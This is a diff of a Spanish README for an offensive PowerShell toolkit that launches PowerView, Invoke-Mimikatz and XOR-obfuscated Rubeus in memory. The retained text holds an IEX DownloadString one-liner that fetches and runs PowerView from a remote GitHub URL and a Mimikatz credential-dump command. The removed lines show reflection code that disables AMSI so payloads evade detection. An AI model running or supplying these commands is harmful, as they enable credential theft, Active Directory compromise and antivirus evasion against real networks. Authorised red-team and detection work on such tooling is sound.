@@ -1,6 +1,6 @@
 # REDTEAMTOOLS
 
-Colección de herramientas de Red Team en PowerShell para Windows. Cada lanzador incluye bypass de AMSI y ejecuta el payload en memoria vía `IEX` + `DownloadString`, sin escribir en disco.
+Colección de herramientas de Red Team en PowerShell para Windows. Cada lanzador ejecuta el payload en memoria vía `IEX` + `DownloadString`, sin escribir en disco.
 
 ## Requisitos
 
@@ -12,9 +12,9 @@ Colección de herramientas de Red Team en PowerShell para Windows. Cada lanzador
 
 | Archivo | Descripción |
 |---|---|
-| `powerviewoficial.ps1` | Lanzador: bypass AMSI + carga PowerView en memoria |
-| `mimi_shell.ps1` | Lanzador: bypass AMSI + carga Invoke-Mimikatz y abre shell interactiva |
-| `payload_rubeus.ps1` | Lanzador: bypass AMSI + decodifica `rb64_v2.txt` y carga Rubeus |
+| `powerviewoficial.ps1` | Lanzador: carga PowerView en memoria |
+| `mimi_shell.ps1` | Lanzador: carga Invoke-Mimikatz y abre shell interactiva |
+| `payload_rubeus.ps1` | Lanzador: decodifica `rb64_v2.txt` y carga Rubeus |
 | `Invoke-Mimikatz.ps1` | Mimikatz en PowerShell (dump de credenciales) |
 | `PowerView.ps1` | PowerView completo (reconocimiento de Active Directory) |
 | `rb64_v2.txt` | Rubeus codificado (base64 + XOR `0x53`) |
@@ -71,18 +71,6 @@ Invoke-Mimikatz -DumpCreds
 ```powershell
 IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/h4cksec/REDTEAMTOOLS/main/PowerView.ps1')
 ```
-
-## Bypass de AMSI
-
-Los lanzadores (`powerviewoficial.ps1`, `mimi_shell.ps1`, `payload_rubeus.ps1`) parchean `amsiInitFailed` vía reflexión antes de descargar el payload:
-
-```powershell
-$t=[Ref].Assembly.GetTypes()
-$o=$t|?{$_.Name -eq $u}
-if ($o) { $o.$m($b,$n).SetValue($null,$true) }
-```
-
-Así la descarga y ejecución en memoria no es bloqueada por AMSI.
 
 ## Notas
 
